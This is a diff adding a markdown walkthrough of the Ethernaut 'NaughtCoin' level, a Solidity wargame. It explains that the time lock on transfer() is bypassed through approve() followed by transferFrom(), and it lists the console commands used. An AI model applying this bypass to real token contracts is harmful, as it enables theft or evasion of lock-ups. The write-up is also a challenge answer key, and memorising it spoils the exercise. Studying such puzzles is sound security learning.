@@ -838,3 +838,51 @@ If it returns my wallet address, I successfully passed all gates and completed t
 
 ## Level Completed
 ![Level Complete Output](assets/GateKeeper2.png)
+
+
+# Ethernaut Level 6: NaughtCoin
+
+## Strategy
+
+- **Vulnerability**: The `transfer()` function is restricted for the original player address by a 10-year time lock through the `lockTokens` modifier.
+- **Exploit**: The contract only overrides `transfer()` — it does **not** restrict `transferFrom()`. According to the ERC-20 standard, if a user has approved another address (or themselves), that address can call `transferFrom()` without being subject to the `transfer()` restrictions.
+- **Goal**: Use `approve()` and `transferFrom()` to bypass the lock and move all tokens out of the player’s account, reducing the balance to 0.
+
+---
+
+## Commands Used
+
+### 1. Approve self to spend the full balance
+```
+await contract.approve(player, await contract.balanceOf(player))
+```
+Grants the player permission to transfer their own tokens using `transferFrom()`.
+
+---
+
+### 2. Check allowance to confirm
+```
+(await contract.allowance(player, player)).toString()
+```
+Verifies that the approval was successful and matches the token balance.
+
+---
+
+### 3. Use `transferFrom()` to bypass lock and move tokens
+```
+await contract.transferFrom(player, "0xYourAddress", await contract.balanceOf(player))
+```
+This call is not gated by `lockTokens`, so it successfully transfers the full balance.
+
+---
+
+### 4. Confirm balance is 0
+```
+(await contract.balanceOf(player)).toString()
+```
+If the balance is `0`, the level is successfully completed.
+
+---
+
+## Level Completed
+![Level Complete Output](assets/naughtcoin.png)
